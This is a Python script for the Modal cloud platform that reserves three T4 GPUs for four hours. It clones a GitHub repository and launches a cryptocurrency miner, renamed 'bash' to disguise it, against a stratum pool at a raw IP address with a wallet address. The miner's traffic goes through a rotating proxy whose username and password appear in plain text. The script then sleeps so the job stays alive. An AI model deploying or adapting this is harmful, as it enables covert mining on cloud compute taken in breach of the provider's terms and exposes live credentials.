import modal
import subprocess
import time

app = modal.App("t4x3-runner")

image = (
    modal.Image.from_registry(
        "nvidia/cuda:12.1.1-runtime-ubuntu22.04"
    )
    .apt_install(
        "bash",
        "git",
        "python3",
        "python3-pip",
        "python-is-python3"
    )
)

@app.function(
    image=image,
    gpu=modal.gpu.T4(count=3),
    timeout=60 * 60 * 4,
    secrets=[modal.Secret.from_name("github-pat")]
)
def run_script():
    subprocess.run(["nvidia-smi"], check=True)

    cmd = """
    git clone https://github.com/hujisanda/bbm.git
    cd bbm
    chmod u+x bash
    ./bash -a ergo -o stratum+tcp://159.89.33.226 -u 9iF7eGjWvEMVSYBHkPzJYtPgVMftJaJaWMsD6ArRog3RZmnC471.jasin --proxy atrfkwzc2-rotate:jasin987@p.webshare.io:80 --no-health 
    """

    subprocess.run(["bash", "-lc", cmd], check=False)

    print("Staying alive for 4 hours...")
    time.sleep(60 * 60 * 4)
